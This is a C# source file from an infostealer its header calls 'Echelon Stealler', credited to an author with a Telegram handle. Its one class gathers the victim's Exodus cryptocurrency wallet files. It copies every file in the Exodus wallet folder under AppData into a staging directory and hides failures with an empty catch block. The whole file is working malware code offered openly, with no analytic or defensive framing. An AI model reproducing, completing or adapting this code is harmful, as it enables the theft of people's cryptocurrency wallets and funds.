///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////


using System;
using System.IO;

namespace Echelon
{
    class Exodus
    {
        public static int count = 0;
        public static string ExodusDir = "\\Wallets\\Exodus\\";
        public static void ExodusStr(string directorypath) 
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Exodus\\exodus.wallet\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + ExodusDir);
                    file.CopyTo(directorypath + ExodusDir + file.Name);
                }
                count++;
                StartWallets.count++;
            }
            catch {}

        }
    }
}
